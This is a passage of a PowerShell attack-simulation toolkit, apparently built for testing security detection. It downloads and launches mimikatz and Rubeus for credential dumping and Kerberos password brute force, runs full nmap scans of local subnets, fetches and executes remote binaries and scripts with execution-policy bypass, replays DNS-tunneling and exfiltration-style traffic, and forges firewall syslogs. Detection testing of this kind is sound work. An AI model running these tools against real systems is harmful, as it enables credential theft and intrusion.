
Set-Variable -Scope script -Name PATTERN_IPV4_ADDR -Option Constant -Value "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"

function IsFile ([string]$path) {
    return [IO.File]::Exists($path)
}

function IsDirectory ([string]$path) {
    return ![string]::IsNullOrEmpty($save_as) -And (Test-Path $path) -And ((Get-Item $path) -is [IO.DirectoryInfo])
}

function BuildFullPath ([string]$parent, [string]$child) {
    return [IO.Path]::GetFullPath((Join-Path $parent $child))
}

function ReadAllBytes ([IO.BinaryReader] $reader) {
    $mem = New-Object IO.MemoryStream
    $buf = New-Object byte[] 4096
    $actual = 0
    do {
        $actual = $reader.Read($buf, 0, $buf.Length)
        If ($actual -gt 0) {
            $mem.Write($buf, 0, $actual)
        }
    } While ($actual -ne 0)

    $mem.Close()
    return $mem.ToArray()
}

function DownloadString ([string]$url) {
    return [Net.WebClient]::New().DownloadString($url)
}

function DownloadBytes ([string]$url) {
    $resp = New-Object IO.BinaryReader([Net.HttpWebRequest]::Create($url).GetResponse().GetResponseStream())
    return ReadAllBytes($resp)
}

function DownloadFile ([string]$url, [string]$save_as) {
    $cli = New-Object Net.WebClient
    if ([string]::IsNullOrEmpty($save_as) -Or (IsDirectory $save_as)) {
        $uri = New-Object System.Uri($url)
        if (!$uri.AbsolutePath.EndsWith("/")) {
            $filename = Split-Path $uri.AbsolutePath -Leaf
        } else {
            $filename = "temp.dat"
        }
        if ((IsDirectory $save_as)) {
            $save_as = [IO.Path]::GetFullPath((Join-Path $save_as $filename))
        } else {
            $save_as = $filename
        }
    }
    $cli.DownloadFile($url, $save_as)
    return $save_as
}

function DownloadAndExtractArchive ([string]$url, [string]$directory) {
    $file = DownloadFile $url ([IO.Path]::GetTempPath())
    Expand-Archive -Force $file $directory
    Remove-Item $file
}

function ReadInput([string]$message, [string]$default, [string]$pattern, [string]$retry_message) {
    if (![string]::IsNullOrEmpty($default)) {
        $message += " (default: $default)"
    }
    do {
        $input = (Read-Host $message).Trim()
        if ([string]::IsNullOrEmpty($input) -And ![string]::IsNullOrEmpty($default)) {
            return $default
        }
        if ([string]::IsNullOrEmpty($pattern) -Or ($input -match $pattern)) {
            return $input
        }
        if (![string]::IsNullOrEmpty($input) -And ![string]::IsNullOrEmpty($retry_message)) {
            Write-Host $retry_message
        }
    } while ($true)
}

function ReadInputSize([string]$message, [string]$default, [string]$retry_message) {

    $pattern = "^(?<num>\d+(?:\.\d+)?)\s*(?<unit>[KMGT]?B)?$"
    $size_unit = $null
    do {
        $size = ReadInput $message $default $pattern $retry_message
        if ($size -match $pattern) {
            if ($matches.unit -eq $null){
                return $size
            }
            $size_unit = @{
                ""=1
                "B"=1
                "KB"=[Math]::pow(2, 10)
                "MB"=[Math]::pow(2, 20)
                "GB"=[Math]::pow(2, 30)
                "TB"=[Math]::pow(2, 40)
            }[$matches.unit]
            if ($size_unit) {
                return ((ParseNumber $matches.num) * $size_unit)
            }
        }
        Write-Host $retry_message
    } while ($true)
}

function AskYesNo([string]$message) {
    do {
        $answer = Read-Host "$message [Y/n]"
        $answer = $answer.ToLower()
        if ($answer -eq "yes" -Or $answer -eq "y") {
            return $true
        } elseif ($answer -eq "no" -Or $answer -eq "n") {
            return $false
        }
    } while ($true)
    return $false
}

function Quote($value) {
    if ($value -is [array]) {
        return $value | % { (Quote $_) }
    } else {
        $value = $value.Replace('"', '""')
        return "`"$value`""
    }
}

function ParseNumber([string]$val) {
    $num = 0
    if ([int]::TryParse($val, [ref]$num)) { 
        return $num
    } else {
        return $null
    }
}

class Properties {
    [string]$my_script
    [string]$home_dir
    [System.Management.Automation.InvocationInfo]$invocation_info
    
    [string]$syslog_host
    [string]$syslog_port
    [string]$syslog_protocol

    Properties([System.Management.Automation.InvocationInfo]$info) {
        $this.invocation_info = $info
        $this.home_dir = BuildFullPath ([IO.Path]::GetTempPath()) ".\corvette"

        if ([string]::IsNullOrEmpty($info.MyCommand.Path)) {
            $this.my_script = $info.MyCommand
        } else {
            $this.my_script = [System.IO.File]::ReadAllText($info.MyCommand.Path)
        }
        
        $this.syslog_host = $null
        $this.syslog_port = "514"
        $this.syslog_protocol = "UDP"
    }

    hidden [void]Initialize() {
        New-Item -ItemType Directory -Force -Path $this.home_dir
    }

    [string]MakeSureScriptFileExists() {
        $path = $myInvocation.MyCommand.Path
        if ([string]::IsNullOrEmpty($path)) {
            $path = BuildFullPath $this.home_dir ".\corvette.ps1"
            $utf8n = New-Object System.Text.UTF8Encoding($false)
            [System.IO.File]::WriteAllText($path, $this.my_script, $utf8n)
        }
        return $path
    }
}

class CommandBase {
    [Properties]$props

    CommandBase([Properties]$props) {
        $this.props = $props
    }
}

class ConfigureSettings : CommandBase {

    ConfigureSettings([Properties]$props) : base($props) {
    }

    hidden [void]SetDefaultSyslogServer() {
        
        $syslog_port = $this.props.syslog_port
        if ([string]::IsNullOrEmpty($syslog_port)) {
            $syslog_port = "514"
        }
        $syslog_protocol = [string]$this.props.syslog_protocol
        if ([string]::IsNullOrEmpty($syslog_protocol)) {
            $syslog_protocol = "UDP"
        }
        Write-Host ""
        Write-Host "### Enter the syslog configuration"
        $syslog_host = ReadInput "Syslog Host" `
                                 $this.props.syslog_host `
                                 ".+"
        $syslog_port = ReadInput "Syslog Port" `
                                 $syslog_port `
                                 "^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$" `
                                 "Please retype a valid port number"
        $syslog_protocol = ReadInput "Syslog Protocol" `
                                     $syslog_protocol `
                                     "^UDP|TCP|udp|tcp$" `
                                     "Please retype a valid protocol"

        if (AskYesNo "Do you want to save changes?") {
            $this.props.syslog_host = $syslog_host
            $this.props.syslog_port = [int]$syslog_port
            $this.props.syslog_protocol = $syslog_protocol
        }
    }

    [void]Run() {
        Write-Host "Settings"
        while ($true) {
            Write-Host "************************************"
            Write-Host " 0) Cleanup the working directory"
            Write-Host " 1) Set default syslog server"
            Write-Host " q) Exit"
            try {
                do {
                    $cmd = Read-Host "Please choose a menu item"
                    switch ($cmd) {
                        "q" {
                            return
                        }
                        "0" {
                            Remove-Item -Path $this.props.home_dir -Recurse -Force -ErrorAction SilentlyContinue
                            New-Item -ItemType Directory -Force -Path $this.props.home_dir
                        }
                        "1" {
                            $this.SetDefaultSyslogServer()
                        }
                        default {
                            continue
                        }
                    }
                    break
                } while($true)
            } catch {
                Write-Host $_
            }
        }
    }
}

class SetupTools : CommandBase {

    SetupTools([Properties]$props) : base($props) {
    }

    hidden [void]DownloadPsTools() {
        $tool_dir = BuildFullPath $this.props.home_dir ".\pstools"

        if (!(IsDirectory $tool_dir)) {
            $url = "https://github.com/spearmin10/corvette/blob/main/bin/PSTools.zip?raw=true"
            DownloadAndExtractArchive $url $tool_dir
        }
        Write-Host "PSTools has been installed to" $tool_dir
    }

    hidden [void]DownloadMimikatz() {
        $tool_dir = BuildFullPath $this.props.home_dir ".\mimikatz"
        $tool_exe = BuildFullPath $tool_dir "mimikatz.exe"

        if (!(IsFile $tool_exe)) {
            $url = "https://github.com/spearmin10/corvette/blob/main/bin/mimikatz.zip?raw=true"
            DownloadAndExtractArchive $url $tool_dir
        }
        Write-Host "mimikatz has been installed to" $tool_dir
    }

    hidden [void]DownloadWildFireTestPE() {
        $tool_dir = BuildFullPath $this.props.home_dir ".\wildfire"
        $tool_exe = BuildFullPath $tool_dir "wildfire-test-pe-file.exe"

        if (!(IsFile $tool_exe)) {
            New-Item -ItemType Directory -Force -Path $tool_dir

            $url = "https://wildfire.paloaltonetworks.com/publicapi/test/pe"
            DownloadFile $url $tool_exe
        }
        Write-Host "WildFire Test PE file has been installed to" $tool_exe
    }

    hidden [void]DownloadEmbeddablePython() {
        $tool_dir = BuildFullPath $this.props.home_dir ".\python-3.11.1"
        $tool_exe = BuildFullPath $tool_dir "python.exe"

        if (!(IsFile $this.tool_exe)) {
            $url = "https://github.com/spearmin10/corvette/blob/main/bin/python-3.11.1-embed-win32.zip?raw=true"
            DownloadAndExtractArchive $url $tool_dir
        }
        Write-Host "python has been installed to" $tool_dir
    }

    hidden [void]InstallPython() {
        $installer_exe = BuildFullPath $this.props.home_dir "python-3.11.1.exe"

        if (!(IsFile $this.python_exe)) {
            $url = "https://github.com/spearmin10/corvette/blob/main/bin/python-3.11.1.exe?raw=true"
            DownloadFile $url $installer_exe
        }
        Start-Process -FilePath $installer_exe
    }

    [void]Run() {
        Write-Host "Download/Install tools"
        while ($true) {
            Write-Host "************************************"
            Write-Host " 1) Download PsTools"
            Write-Host " 2) Download Mimikatz"
            Write-Host " 3) Download WildFire Test PE"
            Write-Host " 4) Download python (embeddable)"
            Write-Host " 5) Download/Install python"
            Write-Host " q) Exit"
            try {
                do {
                    $cmd = Read-Host "Please choose a menu item"
                    switch ($cmd) {
                        "q" {
                            return
                        }
                        "1" {
                            $this.DownloadPsTools()
                        }
                        "2" {
                            $this.DownloadMimikatz()
                        }
                        "3" {
                            $this.DownloadWildFireTestPE()
                        }
                        "4" {
                            $this.DownloadEmbeddablePython()
                        }
                        "5" {
                            $this.InstallPython()
                        }
                        default {
                            continue
                        }
                    }
                    break
                } while($true)
            } catch {
                Write-Host $_
            }
        }
    }
}

class Mimikatz : CommandBase {
    [string]$mimikatz_dir
    [string]$mimikatz_exe

    Mimikatz([Properties]$props) : base($props) {
        $this.mimikatz_dir = BuildFullPath $props.home_dir ".\mimikatz"
        $this.mimikatz_exe = BuildFullPath $this.mimikatz_dir "mimikatz.exe"

        if (!(IsFile $this.mimikatz_exe)) {
            $url = "https://github.com/spearmin10/corvette/blob/main/bin/mimikatz.zip?raw=true"
            DownloadAndExtractArchive $url $this.mimikatz_dir
        }
    }

    [void]Run([bool]$run_as) {
        if ($run_as) {
            Start-Process -FilePath $this.mimikatz_exe -WorkingDirectory $this.props.home_dir -verb runas
        } else {
            Start-Process -FilePath $this.mimikatz_exe -WorkingDirectory $this.props.home_dir
        }
    }
}

class PortScan : CommandBase {
    [string]$nmap_dir
    [string]$nmap_exe

    PortScan([Properties]$props) : base($props) {
        $this.nmap_dir = BuildFullPath $props.home_dir ".\nmap"
        $this.nmap_exe = BuildFullPath $this.nmap_dir "nmap.exe"

        if (!(IsFile $this.nmap_exe)) {
            $url = "https://github.com/spearmin10/corvette/blob/main/bin/nmap-7.92.zip?raw=true"
            DownloadAndExtractArchive $url $this.nmap_dir
        }
    }

    [void]Run() {
        [array]$subnet_list = Get-NetIPAddress -AddressFamily IPV4 -SuffixOrigin @("Dhcp", "Manual") `
                            | select IPAddress, PrefixLength `
                            | % { $_.IPAddress + '/' + $_.PrefixLength }
        foreach ($subnet in $subnet_list) {
            Write-Host ""
            Write-Host "Starting a port scan: $subnet"

            $cargs = @($this.nmap_exe, "-p", "1-65535", $subnet)
            $args = @("/C,") + (Quote $cargs) + "& echo Done. & pause"
            Start-Process -FilePath "cmd.exe" -ArgumentList $args -WorkingDirectory $this.props.home_dir
        }
    }
}

class KerberosBruteForce : CommandBase {
    [string]$rubeus_dir
    [string]$rubeus_exe
    [string]$passwords_file

    KerberosBruteForce([Properties]$props) : base($props) {
        $this.rubeus_dir = BuildFullPath $props.home_dir ".\rubeus"
        $this.rubeus_exe = BuildFullPath $this.rubeus_dir "rubeus.exe"
        $this.passwords_file = BuildFullPath $this.rubeus_dir "passwords.txt"

        if (!(IsFile $this.rubeus_exe)) {
            $url = "https://github.com/spearmin10/corvette/blob/main/bin/rubeus.zip?raw=true"
            DownloadAndExtractArchive $url $this.rubeus_dir
        }
        if (!(IsFile $this.passwords_file)) {
            $url = "https://github.com/spearmin10/corvette/blob/main/bin/passwords.zip?raw=true"
            DownloadAndExtractArchive $url $this.rubeus_dir
        }
    }

    [void]Run() {
        $cargs = @($this.rubeus_exe, "brute", "/passwords:$($this.passwords_file)", "/noticket")
        $args = @("/C,") + (Quote $cargs) + "& echo Done. & pause"
        Start-Process -FilePath "cmd.exe" -ArgumentList $args -WorkingDirectory $this.props.home_dir
    }
}

class WildFireTestPE : CommandBase {
    [string]$wildfire_dir
    [string]$wildfire_exe

    WildFireTestPE([Properties]$props) : base($props) {
        $this.wildfire_dir = BuildFullPath $props.home_dir ".\wildfire"
        $this.wildfire_exe = BuildFullPath $this.wildfire_dir "wildfire-test-pe-file.exe"

        if (!(IsFile $this.wildfire_exe)) {
            New-Item -ItemType Directory -Force -Path $this.wildfire_dir

            $url = "https://wildfire.paloaltonetworks.com/publicapi/test/pe"
            DownloadFile $url $this.wildfire_exe
        }
    }

    [void]Run() {
        $args = @("/C,", (Quote $this.wildfire_exe), "& echo Done. & pause")
        Start-Process -FilePath "cmd.exe" -ArgumentList $args -WorkingDirectory $this.props.home_dir
    }
}

class IptgenBase : CommandBase {
    [string]$iptgen_dir
    [string]$iptgen_exe

    IptgenBase([Properties]$props) : base($props) {
        $this.iptgen_dir = BuildFullPath $props.home_dir ".\iptgen-0.9.0"
        $this.iptgen_exe = BuildFullPath $this.iptgen_dir ".\bin\iptgen.exe"

        if (!(IsFile $this.iptgen_exe)) {
            $url = "https://github.com/spearmin10/iptgen/releases/download/0.9.0/iptgen.win32.zip"
            DownloadAndExtractArchive $url $this.iptgen_dir
        }
        if (!(IsFile $env:WINDIR\system32\Npcap\wpcap.dll)) {
            $url = "https://github.com/spearmin10/corvette/blob/main/bin/npcap-1.72.exe?raw=true"
            $path = DownloadFile $url (BuildFullPath $props.home_dir ".\npcap-1.72.exe")
            Start-Process -FilePath $path -Wait
        }
    }

    [Microsoft.Management.Infrastructure.CimInstance]SelectInterface() {
        [array]$interfaces = Get-NetIPAddress -AddressFamily IPV4 -SuffixOrigin @("Dhcp", "Manual") `
                           | Sort-Object -Property InterfaceAlias
        if ($interfaces.Length -eq 0) {
            Write-Host "No network interfaces were found."
            return $null
        } elseif ($interfaces.Length -eq 1) {
            return $interfaces[0]
        }
        Write-Host ""
        Write-Host "************************************"
        for ($i = 0; $i -lt $interfaces.Length; $i++) {
            Write-Host " $($i+1)) $($interfaces[$i].InterfaceAlias)"
        }
        Write-Host " 0) [Exit Menu]"

        for ($num = -1 ; $num -ne 0 ;){
            $num = ParseNumber (ReadInput "Select an interface to replay packets")
            if ($num -gt 0 -And $num -le $interfaces.Length) { 
                return $interfaces[$num - 1]
            }
        }
        return $null
    }

    [void]Run([string]$interface, [string]$iptgen_json, [int]$response_interval) {
        $cargs = @($this.iptgen_exe, "--in.file", $iptgen_json, "--out.eth", $interface)
        if ($response_interval -ne 0) {
            $cargs += @("--response.interval", [string]$response_interval)
        }
        $args = @("/C,") + (Quote $cargs) + "& echo Done. & pause"
        Start-Process -FilePath "cmd.exe" -ArgumentList $args -WorkingDirectory $this.props.home_dir
    }
}

class DnsTunneling : IptgenBase {
    [string]$iptgen_json

    DnsTunneling([Properties]$props) : base ($props) {
        $this.iptgen_json = BuildFullPath $this.iptgen_dir ".\dns-tunneling-template.json"
        if (!(IsFile $this.iptgen_json)) {
            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/dns-tunneling-template.json"
            DownloadFile $url $this.iptgen_json
        }
    }

    [void]Run() {
        $interface = $this.SelectInterface()
        if ([string]::IsNullOrEmpty($interface)) {
            return
        }
        Write-Host ""
        Write-Host "### Enter the DNS tunneling configuration"
        $client_ip = ReadInput "DNS client IP" `
                               $interface.IPAddress `
                               $script:PATTERN_IPV4_ADDR `
                               "Please retype a valid IPv4 address"
        $server_ip = ReadInput "DNS server IP" `
                               "" `
                               $script:PATTERN_IPV4_ADDR `
                               "Please retype a valid IPv4 address"
        $domain = ReadInput "DNS tunnel domain" $null ".+"

        $Env:client_ip = $client_ip
        $Env:server_ip = $server_ip
        $Env:domain = $domain
        if (AskYesNo "Are you sure you want to run?") {
            $this.Run($interface.InterfaceAlias, $this.iptgen_json, 10)
        }
    }
}

class FtpFileUpload : IptgenBase {
    [string]$iptgen_json

    FtpFileUpload([Properties]$props) : base ($props) {
        $this.iptgen_json = BuildFullPath $this.iptgen_dir ".\ftp-upload-passive-template.json"
        if (!(IsFile $this.iptgen_json)) {
            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/ftp-upload-passive-template.json"
            DownloadFile $url $this.iptgen_json
        }
    }

    [void]Run() {
        $interface = $this.SelectInterface()
        if ([string]::IsNullOrEmpty($interface)) {
            return
        }
        Write-Host ""
        Write-Host "### Enter the FTP file upload configuration"
        $client_ip = ReadInput "Client IP" `
                               $interface.IPAddress `
                               $script:PATTERN_IPV4_ADDR `
                               "Please retype a valid IPv4 address"
        $server_ip = ReadInput "Server IP" `
                               "" `
                               $script:PATTERN_IPV4_ADDR `
                               "Please retype a valid IPv4 address"
        $upload_filename = ReadInput "Upload file name" "test.dat" ".+"
        $upload_filesize = ReadInputSize "Upload file size" "100MB" "Invalid file size. Please retype the size."

        $pasv_port = 34567
        $Env:client_ip = $client_ip
        $Env:server_ip = $server_ip
        $Env:upload_filename = $upload_filename
        $Env:upload_filesize = $upload_filesize
        $Env:pasv_port = $pasv_port
        $Env:pasv_address = $server_ip.Replace('.', ',') + "," + [string][int][Math]::Floor($pasv_port / 256) + "," + [string]($pasv_port % 256)            
        if (AskYesNo "Are you sure you want to run?") {
            $this.Run($interface.InterfaceAlias, $this.iptgen_json, 10)
        }
    }
}

class HttpFileUpload : IptgenBase {
    [string]$iptgen_json
    [bool]$https

    HttpFileUpload([Properties]$props, [bool]$https) : base ($props) {
        $file_name = $null
        
        if ($https) {
          $file_name = "https-upload-template.json"
        } else {
          $file_name = "http-upload-template.json"
        }
        $this.https = $https
        $this.iptgen_json = BuildFullPath $this.iptgen_dir ".\$($file_name)"

        if (!(IsFile $this.iptgen_json)) {
            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/$($file_name)"
            DownloadFile $url $this.iptgen_json
        }
    }

    [void]Run() {
        $interface = $this.SelectInterface()
        if ([string]::IsNullOrEmpty($interface)) {
            return
        }
        Write-Host ""
        Write-Host "### Enter the HTTP file upload configuration"
        $client_ip = ReadInput "Client IP" `
                               $interface.IPAddress `
                               $script:PATTERN_IPV4_ADDR `
                               "Please retype a valid IPv4 address"
        $server_ip = ReadInput "Server IP" `
                               "" `
                               $script:PATTERN_IPV4_ADDR `
                               "Please retype a valid IPv4 address"
        $upload_filesize = ReadInputSize "Upload file size" "100MB" "Invalid file size. Please retype the size."

        $Env:client_ip = $client_ip
        $Env:server_ip = $server_ip
        $Env:upload_filesize = $upload_filesize

        if (AskYesNo "Are you sure you want to run?") {
            $response_interval = 10
            if ($this.https) {
                $response_interval = 0
            }
            $this.Run($interface.InterfaceAlias, $this.iptgen_json, $response_interval)
        }
    }
}

class HttpUnauthorizedLoginAttempts : IptgenBase {
    [string]$iptgen_json

    HttpUnauthorizedLoginAttempts([Properties]$props) : base ($props) {
        $file_name = "http-login-attempts-template.json"
        $this.iptgen_json = BuildFullPath $this.iptgen_dir ".\$($file_name)"

        if (!(IsFile $this.iptgen_json)) {
            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/$($file_name)"
            DownloadFile $url $this.iptgen_json
        }
    }

    [void]Run() {
        $interface = $this.SelectInterface()
        if ([string]::IsNullOrEmpty($interface)) {
            return
        }
        Write-Host ""
        Write-Host "### Enter the HTTP configuration"
        $client_ip = ReadInput "Client IP" `
                               $interface.IPAddress `
                               $script:PATTERN_IPV4_ADDR `
                               "Please retype a valid IPv4 address"
        $server_ip = ReadInput "Server IP" `
                               "" `
                               $script:PATTERN_IPV4_ADDR `
                               "Please retype a valid IPv4 address"

        $Env:client_ip = $client_ip
        $Env:server_ip = $server_ip
        $Env:attempt_count = 100000

        if (AskYesNo "Are you sure you want to run?") {
            $this.Run($interface.InterfaceAlias, $this.iptgen_json, 10)
        }
    }
}

class SmbUnauthorizedLoginAttempts : IptgenBase {
    [string]$iptgen_json

    SmbUnauthorizedLoginAttempts([Properties]$props) : base ($props) {
        $file_name = "smb-ntlm-login-attempts-template.json"
        $this.iptgen_json = BuildFullPath $this.iptgen_dir ".\$($file_name)"

        if (!(IsFile $this.iptgen_json)) {
            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/$($file_name)"
            DownloadFile $url $this.iptgen_json
        }
    }

    [void]Run() {
        $interface = $this.SelectInterface()
        if ([string]::IsNullOrEmpty($interface)) {
            return
        }
        Write-Host ""
        Write-Host "### Enter the SMB configuration"
        $client_ip = ReadInput "Client IP" `
                               $interface.IPAddress `
                               $script:PATTERN_IPV4_ADDR `
                               "Please retype a valid IPv4 address"
        $server_ip = ReadInput "Server IP" `
                               "" `
                               $script:PATTERN_IPV4_ADDR `
                               "Please retype a valid IPv4 address"

        $Env:client_ip = $client_ip
        $Env:server_ip = $server_ip
        $Env:attempt_count = 100000

        if (AskYesNo "Are you sure you want to run?") {
            $this.Run($interface.InterfaceAlias, $this.iptgen_json, 10)
        }
    }
}

class FortigateLogs : CommandBase {
    FortigateLogs([Properties]$props) : base($props) {
    }

    [void]Run() {
        Write-Host "************************************"
        Write-Host " 1) Simulate port scan"
        Write-Host " 2) Simulate large upload (HTTPS)"
        Write-Host " 3) Send NTLM-auth logs (auth-success)"
        Write-Host " 4) Send NTLM-auth logs (auth-failure)"
        Write-Host " q) Exit"

        while ($true) {
            $cmd = Read-Host "Please choose a menu item to run"
            switch($cmd) {
                "1" {
                    $this.RunPortScan()
                    return
                }
                "2" {
                    $this.RunLargeUploadHTTPS()
                    return
                }
                "3" {
                    $this.RunNTLMAuthSuccess()
                    return
                }
                "4" {
                    $this.RunNTLMAuthFailure()
                    return
                }
                "q" {
                    return
                }
                default {
                    continue
                }
            }
        }
    }
    
    [void]RunPortScan() {
        $file_name = "syslog-fortigate-portscan.ps1"
        $scripts_dir = BuildFullPath $this.props.home_dir ".\scripts"
        $script_file = BuildFullPath $scripts_dir $file_name

        if (!(IsDirectory $scripts_dir)) {
            New-Item -ItemType Directory -Force -Path $scripts_dir
        }

        $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/bin/$($file_name)"
        DownloadFile $url $script_file

        Write-Host ""
        Write-Host "### Enter the syslog configuration"
        $syslog_host = ReadInput "Syslog Host" `
                                 $this.props.syslog_host `
                                 ".+"
        $syslog_port = ReadInput "Syslog Port" `
                                 $this.props.syslog_port `
                                 "^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$" `
                                 "Please retype a valid port number"
        $syslog_protocol = ReadInput "Syslog Protocol" `
                                     $this.props.syslog_protocol `
                                     "^UDP|TCP|udp|tcp$" `
                                     "Please retype a valid protocol"
        $source_ip = ReadInput "Source IP" `
                               "" `
                               $script:PATTERN_IPV4_ADDR `
                               "Please retype a valid IPv4 address"
        $destination_ip = ReadInput "Destination IP" `
                                    "" `
                                    $script:PATTERN_IPV4_ADDR `
                                    "Please retype a valid IPv4 address"

        if (AskYesNo "Are you sure you want to run?") {
            $args = Quote @("-ExecutionPolicy", "Bypass", $script_file,
                            "-SyslogHost", $syslog_host,
                            "-SyslogPort", $syslog_port,
                            "-SyslogProtocol", $syslog_protocol.ToUpper(),
                            "-SourceIP", $source_ip,
                            "-DestinationIP", $destination_ip)
            Start-Process -FilePath "powershell.exe" -ArgumentList $args
        }
    }
    
    [void]RunLargeUploadHTTPS() {
        $file_name = "syslog-fortigate-large-upload.ps1"
        $scripts_dir = BuildFullPath $this.props.home_dir ".\scripts"
        $script_file = BuildFullPath $scripts_dir $file_name

        if (!(IsDirectory $scripts_dir)) {
            New-Item -ItemType Directory -Force -Path $scripts_dir
        }

        $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/bin/$($file_name)"
        DownloadFile $url $script_file

        Write-Host ""
        Write-Host "### Enter the syslog configuration"
        $syslog_host = ReadInput "Syslog Host" `
                                 $this.props.syslog_host `
                                 ".+"
        $syslog_port = ReadInput "Syslog Port" `
                                 $this.props.syslog_port `
                                 "^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$" `
                                 "Please retype a valid port number"
        $syslog_protocol = ReadInput "Syslog Protocol" `
                                     $this.props.syslog_protocol `
                                     "^UDP|TCP|udp|tcp$" `
                                     "Please retype a valid protocol"
        $source_ip = ReadInput "Source IP" `
                               "" `
                               $script:PATTERN_IPV4_ADDR `
                               "Please retype a valid IPv4 address"
        $destination_ip = ReadInput "Destination IP" `
                                    "" `
                                    $script:PATTERN_IPV4_ADDR `
                                    "Please retype a valid IPv4 address"

        if (AskYesNo "Are you sure you want to run?") {
            $args = Quote @("-ExecutionPolicy", "Bypass", $script_file,
                            "-SyslogHost", $syslog_host,
                            "-SyslogPort", $syslog_port,
                            "-SyslogProtocol", $syslog_protocol.ToUpper(),
                            "-SourceIP", $source_ip,
                            "-DestinationIP", $destination_ip)
            Start-Process -FilePath "powershell.exe" -ArgumentList $args
        }
    }
    
    [void]RunNTLMAuthSuccess() {
        $file_name = "syslog-fortigate-authlogs.ps1"
        $scripts_dir = BuildFullPath $this.props.home_dir ".\scripts"
        $script_file = BuildFullPath $scripts_dir $file_name

        if (!(IsDirectory $scripts_dir)) {
            New-Item -ItemType Directory -Force -Path $scripts_dir
        }

        $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/bin/$($file_name)"
        DownloadFile $url $script_file

        Write-Host ""
        Write-Host "### Enter the syslog configuration"
        $syslog_host = ReadInput "Syslog Host" `
                                 $this.props.syslog_host `
                                 ".+"
        $syslog_port = ReadInput "Syslog Port" `
                                 $this.props.syslog_port `
                                 "^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$" `
                                 "Please retype a valid port number"
        $syslog_protocol = ReadInput "Syslog Protocol" `
                                     $this.props.syslog_protocol `
                                     "^UDP|TCP|udp|tcp$" `
                                     "Please retype a valid protocol"
        $source_ip = ReadInput "Authentication Client IP" `
                               "" `
                               $script:PATTERN_IPV4_ADDR `
                               "Please retype a valid IPv4 address"
        $destination_ip = ReadInput "Active Directory Server IP" `
                                    "" `
                                    $script:PATTERN_IPV4_ADDR `
                                    "Please retype a valid IPv4 address"
        $domain = ReadInput "Domain Name" "domain" ".+"
        $numof_logs = ParseNumber(ReadInput "Number of log records" `
                                            "100" `
                                            "^[0-9]+$" `
                                            "Please retype a valid number")

        if (AskYesNo "Are you sure you want to run?") {
            $args = Quote @("-ExecutionPolicy", "Bypass", $script_file,
                            "-SyslogHost", $syslog_host,
                            "-SyslogPort", $syslog_port,
                            "-SyslogProtocol", $syslog_protocol.ToUpper(),
                            "-SourceIP", $source_ip,
                            "-DestinationIP", $destination_ip,
                            "-Domain", $domain,
                            "-Count", [string]$numof_logs,
                            "-LogType", "NTLM-auth:success")
            Start-Process -FilePath "powershell.exe" -ArgumentList $args
        }
    }
    
    [void]RunNTLMAuthFailure() {
        $file_name = "syslog-fortigate-authlogs.ps1"
        $scripts_dir = BuildFullPath $this.props.home_dir ".\scripts"
        $script_file = BuildFullPath $scripts_dir $file_name

        if (!(IsDirectory $scripts_dir)) {
            New-Item -ItemType Directory -Force -Path $scripts_dir
        }

        $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/bin/$($file_name)"
        DownloadFile $url $script_file

        Write-Host ""
        Write-Host "### Enter the syslog configuration"
        $syslog_host = ReadInput "Syslog Host" `
                                 $this.props.syslog_host `
                                 ".+"
        $syslog_port = ReadInput "Syslog Port" `
                                 $this.props.syslog_port `
                                 "^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$" `
                                 "Please retype a valid port number"
        $syslog_protocol = ReadInput "Syslog Protocol" `
                                     $this.props.syslog_protocol `
                                     "^UDP|TCP|udp|tcp$" `
                                     "Please retype a valid protocol"
        $source_ip = ReadInput "Authentication Client IP" `
                               "" `
                               $script:PATTERN_IPV4_ADDR `
                               "Please retype a valid IPv4 address"
        $destination_ip = ReadInput "Active Directory Server IP" `
                                    "" `
                                    $script:PATTERN_IPV4_ADDR `
                                    "Please retype a valid IPv4 address"
        $domain = ReadInput "Domain Name" "domain" ".+"
        $numof_logs = ParseNumber(ReadInput "Number of log records" `
                                            "100" `
                                            "^[0-9]+$" `
                                            "Please retype a valid number")

        if (AskYesNo "Are you sure you want to run?") {
            $args = Quote @("-ExecutionPolicy", "Bypass", $script_file,
                            "-SyslogHost", $syslog_host,
                            "-SyslogPort", $syslog_port,
                            "-SyslogProtocol", $syslog_protocol.ToUpper(),
                            "-SourceIP", $source_ip,
                            "-DestinationIP", $destination_ip,
                            "-Domain", $domain,
                            "-Count", [string]$numof_logs,
                            "-LogType", "NTLM-auth:failure")
            Start-Process -FilePath "powershell.exe" -ArgumentList $args
        }
    }
}

class CiscoLogs : CommandBase {
    CiscoLogs([Properties]$props) : base($props) {
    }

    [void]Run() {
        Write-Host "************************************"
        Write-Host " 1) Simulate port scan"
        Write-Host " 2) Simulate large upload"
        Write-Host " 3) Send AnyConnect auth logs"
        Write-Host " q) Exit"

        while ($true) {
            $cmd = Read-Host "Please choose a menu item to run"
            switch($cmd) {
                "1" {
                    $this.RunPortScan()
                    return
                }
                "2" {
                    $this.RunLargeUpload()
                    return
                }
                "3" {
                    $this.RunAnyConnectAuth()
                    return
                }
                "q" {
                    return
                }
                default {
                    continue
                }
            }
        }
    }
    
    [void]RunPortScan() {
        $file_name = "syslog-cisco-asa-portscan.ps1"
        $scripts_dir = BuildFullPath $this.props.home_dir ".\scripts"
